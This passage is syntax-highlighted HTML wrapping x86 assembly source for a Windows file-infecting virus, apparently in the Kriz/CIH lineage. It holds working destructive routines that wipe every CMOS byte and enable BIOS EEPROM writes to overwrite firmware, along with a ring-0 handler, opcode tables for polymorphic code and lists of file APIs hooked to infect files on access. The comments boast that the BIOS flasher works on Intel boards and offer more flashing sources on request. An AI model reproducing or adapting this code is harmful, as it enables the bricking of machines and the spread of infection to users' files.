        </span><span class="sc6">INT</span><span class="sc0">     </span><span class="sc2">03h</span><span class="sc0">

</span><span class="sc5">Exit_Trash_Dir</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc8">ESP</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">318</span><span class="sc4">+</span><span class="sc2">260</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">)</span><span class="sc0">        </span><span class="sc1">; Clean-up our stackspace.</span><span class="sc0">

        </span><span class="sc6">POPAD</span><span class="sc0">

        </span><span class="sc6">RET</span><span class="sc0">



</span><span class="sc1">;-------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">; Overwrite CMOS and attempt to flash the BIOS chipset.</span><span class="sc0">
</span><span class="sc1">;-------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">Ring0_Handler</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">PUSHFD</span><span class="sc0">
        </span><span class="sc6">PUSHAD</span><span class="sc0">

        </span><span class="sc6">CLI</span><span class="sc0">

        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">64</span><span class="sc0">                  </span><span class="sc1">; Take all 64 bytes of CMOS.</span><span class="sc0">

</span><span class="sc5">Nuke_CMOS_Byte</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">DEC</span><span class="sc0">     </span><span class="sc8">CL</span><span class="sc0">                      </span><span class="sc1">; We've did 'em all?</span><span class="sc0">
        </span><span class="sc6">JS</span><span class="sc0">      </span><span class="sc5">Nuke_BIOS</span><span class="sc0">

        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">CL</span><span class="sc0">                  </span><span class="sc1">; Request I/O to byte CL.</span><span class="sc0">
        </span><span class="sc6">OUT</span><span class="sc0">     </span><span class="sc2">70h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc0">

        </span><span class="sc6">XOR</span><span class="sc0">     </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc0">                  </span><span class="sc1">; Trash the byte.</span><span class="sc0">
        </span><span class="sc6">OUT</span><span class="sc0">     </span><span class="sc2">71h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc0">

        </span><span class="sc6">JMP</span><span class="sc0">     </span><span class="sc5">Nuke_CMOS_Byte</span><span class="sc0">          </span><span class="sc1">; Repeat until all is done.</span><span class="sc0">

        </span><span class="sc1">; The CIH BIOS-flasher should work on every Intel-board</span><span class="sc0">
        </span><span class="sc1">; out there, which are becoming increasingly common.</span><span class="sc0">
        </span><span class="sc1">; I have fully commented Pascal sources of how to flash</span><span class="sc0">
        </span><span class="sc1">; Intel and other boards, available on request.</span><span class="sc0">

</span><span class="sc5">Nuke_BIOS</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc1">; Show BIOS Page in 000E0000 - 000EFFFF (64k).</span><span class="sc0">

        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">EDI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8000384Ch</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">BP</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0CF8h</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0CFEh</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">IOForEEPROM</span><span class="sc0">

        </span><span class="sc1">; Show BIOS Page in 000F0000 - 000FFFFF (64k).</span><span class="sc0">

        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0058h</span><span class="sc0">
        </span><span class="sc6">DEC</span><span class="sc0">     </span><span class="sc8">EDX</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EBP</span><span class="sc4">+(</span><span class="sc5">Switch</span><span class="sc4">-</span><span class="sc5">START</span><span class="sc4">)],</span><span class="sc0"> </span><span class="sc2">0F24h</span><span class="sc0">    </span><span class="sc1">; AND AL, 0Fh</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">IOForEEPROM</span><span class="sc0">

</span><span class="sc1">; ***********************</span><span class="sc0">
</span><span class="sc1">; * Show the BIOS Extra *</span><span class="sc0">
</span><span class="sc1">; * ROM Data in Memory  *</span><span class="sc0">
</span><span class="sc1">; * 000E0000 - 000E01FF *</span><span class="sc0">
</span><span class="sc1">; *   (   512 Bytes   ) *</span><span class="sc0">
</span><span class="sc1">; * , and the Section   *</span><span class="sc0">
</span><span class="sc1">; * of Extra BIOS can   *</span><span class="sc0">
</span><span class="sc1">; * be Writted...       *</span><span class="sc0">
</span><span class="sc1">; ***********************</span><span class="sc0">

        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0E5555h</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">ECX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0E2AAAh</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">EnableEEPROMToWrite</span><span class="sc0">

        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EAX</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">60h</span><span class="sc0">

        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">ECX</span><span class="sc0">

        </span><span class="sc6">LOOP</span><span class="sc0">    </span><span class="sc10">$</span><span class="sc0">

        </span><span class="sc1">; Destroy BIOS Extra ROM Data in 000E0000h - 000E007Fh, (80h bytes).</span><span class="sc0">

        </span><span class="sc6">XOR</span><span class="sc0">     </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EAX</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc12">'RI'</span><span class="sc0">    </span><span class="sc1">; Dare yew go TU :P</span><span class="sc0">

        </span><span class="sc6">XCHG</span><span class="sc0">    </span><span class="sc8">ECX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc0">

        </span><span class="sc6">LOOP</span><span class="sc0">    </span><span class="sc10">$</span><span class="sc0">

</span><span class="sc1">; ***********************</span><span class="sc0">
</span><span class="sc1">; * Show and Enable the *</span><span class="sc0">
</span><span class="sc1">; * BIOS Main ROM Data  *</span><span class="sc0">
</span><span class="sc1">; * 000E0000 - 000FFFFF *</span><span class="sc0">
</span><span class="sc1">; *   (   128 KB   )    *</span><span class="sc0">
</span><span class="sc1">; * can be Writted...   *</span><span class="sc0">
</span><span class="sc1">; ***********************</span><span class="sc0">

        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0F5555h</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">ECX</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0AAh</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">EnableEEPROMToWrite</span><span class="sc0">

        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EAX</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">20h</span><span class="sc0">

        </span><span class="sc6">LOOP</span><span class="sc0">    </span><span class="sc10">$</span><span class="sc0">

        </span><span class="sc1">; Destroy BIOS Main ROM Data in 000FE000h - 000FE07Fh (80h bytes).</span><span class="sc0">

        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0E0h</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">EAX</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc0">

        </span><span class="sc1">; Hide BIOS Page in 000F0000 - 000FFFFF (64k).</span><span class="sc0">

        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EBP</span><span class="sc4">+(</span><span class="sc5">Switch</span><span class="sc4">-</span><span class="sc5">START</span><span class="sc4">)],</span><span class="sc0"> </span><span class="sc2">100Ch</span><span class="sc0">    </span><span class="sc1">; or al,10h</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">IOForEEPROM</span><span class="sc0">

        </span><span class="sc6">POPAD</span><span class="sc0">
        </span><span class="sc6">POPFD</span><span class="sc0">

        </span><span class="sc6">IRETD</span><span class="sc0">


</span><span class="sc1">; Enable EEPROM to Write.</span><span class="sc0">
</span><span class="sc5">EnableEEPROMToWrite</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">EAX</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">CL</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ECX</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc0">

        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EAX</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">80h</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">EAX</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">CL</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ECX</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc0">

        </span><span class="sc6">RET</span><span class="sc0">



</span><span class="sc1">; I/O for EEPROM.</span><span class="sc0">
</span><span class="sc5">IOForEEPROM</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">XCHG</span><span class="sc0">    </span><span class="sc8">EDI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc0">
        </span><span class="sc6">XCHG</span><span class="sc0">    </span><span class="sc8">EDX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">EBP</span><span class="sc0">
        </span><span class="sc6">OUT</span><span class="sc0">     </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc0">

        </span><span class="sc6">XCHG</span><span class="sc0">    </span><span class="sc8">EDI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc0">
        </span><span class="sc6">XCHG</span><span class="sc0">    </span><span class="sc8">EDX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">EBP</span><span class="sc0">
        </span><span class="sc6">IN</span><span class="sc0">      </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc0">

        </span><span class="sc6">OR</span><span class="sc0">      </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">44h</span><span class="sc0">
</span><span class="sc5">Switch</span><span class="sc0">          </span><span class="sc4">=</span><span class="sc0">       </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc0">

        </span><span class="sc6">XCHG</span><span class="sc0">    </span><span class="sc8">EDI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc0">
        </span><span class="sc6">XCHG</span><span class="sc0">    </span><span class="sc8">EDX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">EBP</span><span class="sc0">
        </span><span class="sc6">OUT</span><span class="sc0">     </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc0">

        </span><span class="sc6">XCHG</span><span class="sc0">    </span><span class="sc8">EDI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc0">
        </span><span class="sc6">XCHG</span><span class="sc0">    </span><span class="sc8">EDX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">EBP</span><span class="sc0">
        </span><span class="sc6">OUT</span><span class="sc0">     </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc0">

        </span><span class="sc6">RET</span><span class="sc0">


</span><span class="sc1">; Returns random number between 0 and EAX-1.</span><span class="sc0">
</span><span class="sc5">Get_Random</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">PUSHAD</span><span class="sc0">

        </span><span class="sc6">XCHG</span><span class="sc0">    </span><span class="sc8">EBX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc0">

        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc5">ixGetTickCount</span><span class="sc0">
        </span><span class="sc6">INT</span><span class="sc0">     </span><span class="sc2">03h</span><span class="sc0">

        </span><span class="sc6">RCL</span><span class="sc0">     </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">

        </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">12345678h</span><span class="sc0">
</span><span class="sc5">Random_Seed</span><span class="sc0">     </span><span class="sc4">=</span><span class="sc0">       </span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">

        </span><span class="sc6">ADC</span><span class="sc0">     </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ESP</span><span class="sc0">

        </span><span class="sc6">XOR</span><span class="sc0">     </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ECX</span><span class="sc0">

        </span><span class="sc6">XOR</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">EBP</span><span class="sc4">+(</span><span class="sc5">Random_Seed</span><span class="sc4">-</span><span class="sc5">START</span><span class="sc4">)],</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc0">

        </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ESP</span><span class="sc4">-(</span><span class="sc2">13</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">)]</span><span class="sc0">

        </span><span class="sc6">RCL</span><span class="sc0">     </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">

        </span><span class="sc6">XOR</span><span class="sc0">     </span><span class="sc8">EDX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">EDX</span><span class="sc0">
        </span><span class="sc6">DIV</span><span class="sc0">     </span><span class="sc8">EBX</span><span class="sc0">

        </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">EBP</span><span class="sc4">+(</span><span class="sc5">Random_Seed</span><span class="sc4">-</span><span class="sc5">START</span><span class="sc4">)],</span><span class="sc0"> </span><span class="sc8">EDX</span><span class="sc0">

        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ESP</span><span class="sc4">+(</span><span class="sc2">7</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">)],</span><span class="sc0"> </span><span class="sc8">EDX</span><span class="sc0">

        </span><span class="sc6">POPAD</span><span class="sc0">

        </span><span class="sc6">OR</span><span class="sc0">      </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc0">

        </span><span class="sc6">RET</span><span class="sc0">


</span><span class="sc5">KERNEL32_Name</span><span class="sc0">   </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc12">'\KERNEL32.DLL'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">Infected_K32</span><span class="sc0">    </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc12">'\KRIZED.TT6'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">API_Addresses</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc4">(</span><span class="sc5">Work_API_Count</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">Hook_API_Count</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc9">DUP</span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc5">Hook_Exports</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc5">Hook_API_Count</span><span class="sc0"> </span><span class="sc9">DUP</span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">


</span><span class="sc1">;                       EAX   EBX   ECX   EDX   ESI   EDI   EBP</span><span class="sc0">
</span><span class="sc5">ADD_Reg32</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">0C0h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0C3h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0C1h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0C2h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0C6h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0C7h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0C5h</span><span class="sc0">
</span><span class="sc5">POP_Reg32</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">058h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">05Bh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">059h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">05Ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">05Eh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">05Fh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">05Dh</span><span class="sc0">
</span><span class="sc5">DEC_Reg32</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">048h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">04Bh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">049h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">04Ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">04Eh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">04Fh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">04Dh</span><span class="sc0">
</span><span class="sc5">MOV_Reg32</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">0B8h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0BBh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0B9h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0BAh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0BEh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0BFh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0BDh</span><span class="sc0">
</span><span class="sc5">XOR_Ptr_Reg32</span><span class="sc0">   </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">0B0h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0B3h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0B1h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0B2h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0B6h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0B7h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0B5h</span><span class="sc0">
</span><span class="sc5">PUSH_Reg32</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">050h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">053h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">051h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">052h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">056h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">057h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">055h</span><span class="sc0">
</span><span class="sc1">;                       ESP   CS    DS    ES    SS    FLAGS</span><span class="sc0">
</span><span class="sc5">PUSH_Reg16_32</span><span class="sc0">   </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">054h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00Eh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">01Eh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">006h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">016h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">09Ch</span><span class="sc0">


</span><span class="sc1">; API which we hook in order to intercept file-access.</span><span class="sc0">

</span><span class="sc5">Hook_API_CRC</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc5">CRC16</span><span class="sc0">   </span><span class="sc4">&lt;</span><span class="sc5">CopyFileA</span><span class="sc4">&gt;</span><span class="sc0">
        </span><span class="sc5">CRC16</span><span class="sc0">   </span><span class="sc4">&lt;</span><span class="sc5">CreateFileA</span><span class="sc4">&gt;</span><span class="sc0">
        </span><span class="sc5">CRC16</span><span class="sc0">   </span><span class="sc4">&lt;</span><span class="sc5">CreateProcessA</span><span class="sc4">&gt;</span><span class="sc0">
        </span><span class="sc5">CRC16</span><span class="sc0">   </span><span class="sc4">&lt;</span><span class="sc5">DeleteFileA</span><span class="sc4">&gt;</span><span class="sc0">
        </span><span class="sc5">CRC16</span><span class="sc0">   </span><span class="sc4">&lt;</span><span class="sc5">GetFileAttributesA</span><span class="sc4">&gt;</span><span class="sc0">
        </span><span class="sc5">CRC16</span><span class="sc0">   </span><span class="sc4">&lt;</span><span class="sc5">MoveFileA</span><span class="sc4">&gt;</span><span class="sc0">
        </span><span class="sc5">CRC16</span><span class="sc0">   </span><span class="sc4">&lt;</span><span class="sc5">MoveFileExA</span><span class="sc4">&gt;</span><span class="sc0">
        </span><span class="sc5">CRC16</span><span class="sc0">   </span><span class="sc4">&lt;</span><span class="sc5">SetFileAttributesA</span><span class="sc4">&gt;</span><span class="sc0">

        </span><span class="sc5">CRC16</span><span class="sc0">   </span><span class="sc4">&lt;</span><span class="sc5">CopyFileW</span><span class="sc4">&gt;</span><span class="sc0">
        </span><span class="sc5">CRC16</span><span class="sc0">   </span><span class="sc4">&lt;</span><span class="sc5">CreateFileW</span><span class="sc4">&gt;</span><span class="sc0">
        </span><span class="sc5">CRC16</span><span class="sc0">   </span><span class="sc4">&lt;</span><span class="sc5">CreateProcessW</span><span class="sc4">&gt;</span><span class="sc0">
        </span><span class="sc5">CRC16</span><span class="sc0">   </span><span class="sc4">&lt;</span><span class="sc5">DeleteFileW</span><span class="sc4">&gt;</span><span class="sc0">
        </span><span class="sc5">CRC16</span><span class="sc0">   </span><span class="sc4">&lt;</span><span class="sc5">GetFileAttributesW</span><span class="sc4">&gt;</span><span class="sc0">
        </span><span class="sc5">CRC16</span><span class="sc0">   </span><span class="sc4">&lt;</span><span class="sc5">MoveFileW</span><span class="sc4">&gt;</span><span class="sc0">
        </span><span class="sc5">CRC16</span><span class="sc0">   </span><span class="sc4">&lt;</span><span class="sc5">MoveFileExW</span><span class="sc4">&gt;</span><span class="sc0">
        </span><span class="sc5">CRC16</span><span class="sc0">   </span><span class="sc4">&lt;</span><span class="sc5">SetFileAttributesW</span><span class="sc4">&gt;</span><span class="sc0">

</span><span class="sc1">; API which we need in order to function.</span><span class="sc0">

</span><span class="sc5">Work_API_CRC</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc5">CRC16</span><span class="sc0">   </span><span class="sc4">&lt;</span><span class="sc5">CloseHandle</span><span class="sc4">&gt;</span><span class="sc0">
        </span><span class="sc5">CRC16</span><span class="sc0">   </span><span class="sc4">&lt;</span><span class="sc5">CreateFileMappingA</span><span class="sc4">&gt;</span><span class="sc0">
        </span><span class="sc5">CRC16</span><span class="sc0">   </span><span class="sc4">&lt;</span><span class="sc5">FindClose</span><span class="sc4">&gt;</span><span class="sc0">
        </span><span class="sc5">CRC16</span><span class="sc0">   </span><span class="sc4">&lt;</span><span class="sc5">FindFirstFileA</span><span class="sc4">&gt;</span><span class="sc0">
        </span><span class="sc5">CRC16</span><span class="sc0">   </span><span class="sc4">&lt;</span><span class="sc5">FindNextFileA</span><span class="sc4">&gt;</span><span class="sc0">
        </span><span class="sc5">CRC16</span><span class="sc0">   </span><span class="sc4">&lt;</span><span class="sc5">GetCurrentDirectoryA</span><span class="sc4">&gt;</span><span class="sc0">
        </span><span class="sc5">CRC16</span><span class="sc0">   </span><span class="sc4">&lt;</span><span class="sc5">GetDriveTypeA</span><span class="sc4">&gt;</span><span class="sc0">
        </span><span class="sc5">CRC16</span><span class="sc0">   </span><span class="sc4">&lt;</span><span class="sc5">GetFileSize</span><span class="sc4">&gt;</span><span class="sc0">
        </span><span class="sc5">CRC16</span><span class="sc0">   </span><span class="sc4">&lt;</span><span class="sc5">GetFileTime</span><span class="sc4">&gt;</span><span class="sc0">
        </span><span class="sc5">CRC16</span><span class="sc0">   </span><span class="sc4">&lt;</span><span class="sc5">GetLastError</span><span class="sc4">&gt;</span><span class="sc0">
        </span><span class="sc5">CRC16</span><span class="sc0">   </span><span class="sc4">&lt;</span><span class="sc5">GetLocalTime</span><span class="sc4">&gt;</span><span class="sc0">
        </span><span class="sc5">CRC16</span><span class="sc0">   </span><span class="sc4">&lt;</span><span class="sc5">GetLogicalDriveStringsA</span><span class="sc4">&gt;</span><span class="sc0">
        </span><span class="sc5">CRC16</span><span class="sc0">   </span><span class="sc4">&lt;</span><span class="sc5">GetProcAddress</span><span class="sc4">&gt;</span><span class="sc0">
        </span><span class="sc5">CRC16</span><span class="sc0">   </span><span class="sc4">&lt;</span><span class="sc5">GetSystemDirectoryA</span><span class="sc4">&gt;</span><span class="sc0">
        </span><span class="sc5">CRC16</span><span class="sc0">   </span><span class="sc4">&lt;</span><span class="sc5">GetTickCount</span><span class="sc4">&gt;</span><span class="sc0">
        </span><span class="sc5">CRC16</span><span class="sc0">   </span><span class="sc4">&lt;</span><span class="sc5">GetWindowsDirectoryA</span><span class="sc4">&gt;</span><span class="sc0">
        </span><span class="sc5">CRC16</span><span class="sc0">   </span><span class="sc4">&lt;</span><span class="sc5">GlobalAlloc</span><span class="sc4">&gt;</span><span class="sc0">
        </span><span class="sc5">CRC16</span><span class="sc0">   </span><span class="sc4">&lt;</span><span class="sc5">GlobalFree</span><span class="sc4">&gt;</span><span class="sc0">
        </span><span class="sc5">CRC16</span><span class="sc0">   </span><span class="sc4">&lt;</span><span class="sc5">LoadLibraryA</span><span class="sc4">&gt;</span><span class="sc0">
        </span><span class="sc5">CRC16</span><span class="sc0">   </span><span class="sc4">&lt;</span><span class="sc5">MapViewOfFile</span><span class="sc4">&gt;</span><span class="sc0">
        </span><span class="sc5">CRC16</span><span class="sc0">   </span><span class="sc4">&lt;</span><span class="sc5">SetCurrentDirectoryA</span><span class="sc4">&gt;</span><span class="sc0">
        </span><span class="sc5">CRC16</span><span class="sc0">   </span><span class="sc4">&lt;</span><span class="sc5">SetFileTime</span><span class="sc4">&gt;</span><span class="sc0">
        </span><span class="sc5">CRC16</span><span class="sc0">   </span><span class="sc4">&lt;</span><span class="sc5">UnmapViewOfFile</span><span class="sc4">&gt;</span><span class="sc0">
        </span><span class="sc5">CRC16</span><span class="sc0">   </span><span class="sc4">&lt;</span><span class="sc5">WriteFile</span><span class="sc4">&gt;</span><span class="sc0">
        </span><span class="sc5">CRC16</span><span class="sc0">   </span><span class="sc4">&lt;</span><span class="sc5">WritePrivateProfileStringA</span><span class="sc4">&gt;</span><span class="sc0">

</span><span class="sc5">End_Work_API_CRC</span><span class="sc4">:</span><span class="sc0">


</span><span class="sc5">Dispatch_API</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc1">; ANSI.</span><span class="sc0">

